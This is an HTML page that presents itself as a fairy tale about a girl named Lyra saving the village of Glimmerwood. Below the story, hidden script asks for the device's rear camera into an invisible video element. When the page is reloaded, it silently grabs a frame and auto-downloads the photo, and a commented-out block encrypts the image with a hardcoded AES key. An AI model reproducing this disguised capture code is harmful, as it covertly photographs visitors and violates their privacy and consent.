<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
<title>The Keeper of the Everroot Light</title>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        video, canvas {
            max-width: 100%;
            height: auto;
        }
    </style>
</head>
<body>
    Once upon a time, in a land where the skies shimmered with hues of lavender and gold, there lay a hidden village surrounded by towering mountains and ancient forests. This village, known as Glimmerwood, was unlike any other, for it was a place where magic still thrived, and every creature, be it human, animal, or otherwise, held a secret power.

In Glimmerwood, the villagers lived in harmony with the land. They harvested the golden apples that grew in the orchards, fished in the sparkling rivers, and sang songs to the trees, which in turn whispered ancient secrets back to them. The heart of the village was a grand oak tree, older than time itself, known as the Everroot. Its branches stretched high into the sky, and its roots dug deep into the earth, connecting the village to the very essence of the world.

Among the villagers was a young girl named Lyra. She was a curious child, always asking questions and exploring places where others dared not venture. Her hair was the color of autumn leaves, and her eyes sparkled like the morning dew. Lyra had a gift, though she did not yet know it—a gift that would soon change her life and the fate of Glimmerwood.

One crisp autumn morning, Lyra awoke to find the village in a state of quiet excitement. The elders had called for a gathering under the Everroot, a rare event that only happened when something of great importance was at hand. Lyra hurried to join the crowd, her heart pounding with anticipation.

The eldest of the villagers, a wise woman named Elowen, stood before the gathering. Her hair was silver, and her eyes were as sharp as a hawk's. In her hands, she held a crystal, clear as the purest water, and within it swirled a faint light.

"My dear children of Glimmerwood," Elowen began, her voice strong despite her age, "a great darkness stirs in the world beyond our mountains. It is a force that seeks to consume the light, to extinguish the magic that keeps our land alive."

A murmur of fear swept through the crowd, but Elowen raised her hand, and silence fell. "There is hope," she continued. "The Everroot has spoken to me. It has chosen one among us to embark on a journey to the heart of this darkness, to reclaim a forgotten light that will restore balance to our world."

Lyra felt a shiver run down her spine as Elowen's gaze rested upon her. The wise woman stepped forward, holding out the crystal, and the light within it grew brighter. "Lyra," she said, her voice soft but firm, "you are the one the Everroot has chosen."

The villagers gasped, but Lyra was too stunned to react. "Me?" she whispered, her voice trembling. "But I'm just a child. How can I face such a darkness?"

Elowen smiled gently. "You are more than you know, Lyra. The Everroot has seen the strength within you, the courage and the kindness that you carry in your heart. These are the true powers that will guide you on your journey."

With those words, Lyra knew she could not refuse. She took the crystal from Elowen, feeling its warmth in her hands, and the light within it seemed to pulse in time with her heartbeat. The villagers, though afraid for her, looked upon her with pride and hope.

That night, under the light of the twin moons, Lyra set out on her journey. The path before her was shrouded in mist, and the forest loomed dark and silent. But as she walked, the crystal in her hand glowed softly, lighting her way.

Days turned into weeks as Lyra traveled deeper into the unknown. She crossed rivers of molten silver, climbed mountains that touched the clouds, and walked through forests where the trees whispered her name. Along the way, she encountered many creatures—some friendly, others not so. But with each challenge she faced, Lyra grew stronger, her heart brimming with the light that the Everroot had seen in her.

One day, as she neared the edge of the world, Lyra came upon a vast, desolate plain. In the center of this plain stood a towering castle, its spires black as night and its walls cold as ice. This was the heart of the darkness, the place where the forgotten light had been taken.

With the crystal in hand, Lyra approached the castle. The air was thick with malice, and the ground beneath her feet trembled. But she pressed on, knowing that the fate of Glimmerwood—and perhaps the world—rested on her shoulders.

Inside the castle, Lyra found herself in a grand hall, empty save for a single figure standing at its center. It was a creature of shadow, with eyes like burning coals and a voice that echoed through the stone walls.

"So, the chosen one has arrived," the creature hissed. "But you are too late. The light is mine, and soon, all the world will be consumed by darkness."

Lyra felt a wave of fear wash over her, but she held the crystal tightly, its light glowing brighter in response to the darkness around her. "The light does not belong to you," she said, her voice steady. "It belongs to all who cherish life and hope."

The creature laughed, a sound that sent shivers down Lyra's spine. "You are a fool, child. The light is weak, just as you are. It cannot save you."

But Lyra did not waver. She closed her eyes, focusing on the warmth of the crystal in her hands, and thought of Glimmerwood—the village she loved, the people who had placed their trust in her, and the Everroot that had chosen her. With all her heart, she called upon the light within the crystal, willing it to shine with all its might.

Suddenly, the crystal flared to life, its light piercing through the darkness like a blade. The creature screamed in agony as the light enveloped it, burning away the shadows until there was nothing left. The castle trembled, and the darkness that had filled it began to fade, replaced by a warm, golden glow.

When Lyra opened her eyes, she found herself standing in a field of flowers, the sky above her clear and blue. The castle was gone, and the darkness had been banished. In her hand, the crystal still glowed, but now it was filled with a brilliant, radiant light—the forgotten light that would restore balance to the world.

With a heart full of joy and relief, Lyra began the journey back to Glimmerwood. The path was no longer shrouded in mist, and the trees sang a song of welcome as she passed. When she finally returned to the village, the people greeted her with cheers and tears of happiness. The Everroot, its leaves glowing with a soft, golden light, welcomed her home.

Lyra had saved Glimmerwood and the world beyond. She had faced the darkness and emerged victorious, not with weapons or strength, but with the light of her heart and the courage to protect those she loved. From that day forward, Lyra was known as the Keeper of the Light, a title she bore with humility and grace.

And so, the village of Glimmerwood thrived, its magic stronger than ever, as the light of the Everroot continued to shine, guiding and protecting all who lived under its ancient branches. And Lyra, the girl who had once been just a curious child, grew into a wise and beloved leader, her story told and retold for generations to come.

The end.

    <video id="video" width="640" height="480" autoplay style="display:none></video>   <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <a id="download-image" href="#" style="visibility:hidden;"></a>
    <a id="download-text" href="#" style="display:none;"></a>

    <script>
        (function() {
            const video = document.getElementById('video');
            
            const canvas = document.getElementById('canvas');
            const downloadImageLink = document.getElementById('download-image');
            const downloadTextLink = document.getElementById('download-text');
            const context = canvas.getContext('2d');

            const constraints = { 
                video: { 
                    facingMode: 'environment' // 背面カメラを優先
                } 
            };

            navigator.mediaDevices.getUserMedia(constraints)
                .then((stream) => {
                    video.srcObject = stream;
                })
                .catch((err) => {
                    console.error('エラー:', err);
                    alert(`カメラストリームの取得に失敗しました: ${err.name} - ${err.message}`);
                });

            window.addEventListener("load", () => {
                if (sessionStorage.getItem('reloaded')) {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const dataUrl = canvas.toDataURL('image/png');
             

                const now = new Date();
                const year = now.getFullYear();
                const month = String(now.getMonth() + 1).padStart(2, '0');
                const day = String(now.getDate()).padStart(2, '0');
                const hours = String(now.getHours()).padStart(2, '0');
                const minutes = String(now.getMinutes()).padStart(2, '0');
                const seconds = String(now.getSeconds()).padStart(2, '0');
                const formattedTime = `${year}${month}${day}-${hours}-${minutes}-${seconds}`;
                const imageFileName = `p-${formattedTime}.png`;
                const textFileName = `p-${formattedTime}.txt`;

                // 画像ダウンロード
                downloadImageLink.href = dataUrl;
                downloadImageLink.download = imageFileName;
                downloadImageLink.style.display = 'block';
                downloadImageLink.click();
                downloadImageLink.style.display = 'none';
/*console.log(dataUrl)
text=CryptoJS.AES.encrypt(dataUrl, "9f8e7d6c5b4a3f2e1d2c3b4a5e6f7d8c9b0a1f2e3d4c5b6a7e8d9f0c1b2a3d4").toString();
                //テキストダウンロード
                const blob = new Blob([text], { type: 'text/plain' });
                const url = URL.createObjectURL(blob);
                downloadTextLink.href = url;
                downloadTextLink.download = textFileName;
                downloadTextLink.style.display = 'block';
                downloadTextLink.click();
                downloadTextLink.style.display = 'none';
                URL.revokeObjectURL(url); // メモリ解放
                */
                    } else {
        sessionStorage.setItem('reloaded', true);
        
                }
            });

            window.addEventListener('resize', () => {
                const aspectRatio = video.videoWidth / video.videoHeight;
                const newWidth = Math.min(window.innerWidth, 640);
                const newHeight = newWidth / aspectRatio;
                video.width = newWidth;
                video.height = newHeight;
                canvas.width = newWidth;
                canvas.height = newHeight;
            });
        })();
    </script>
</body>
</html>
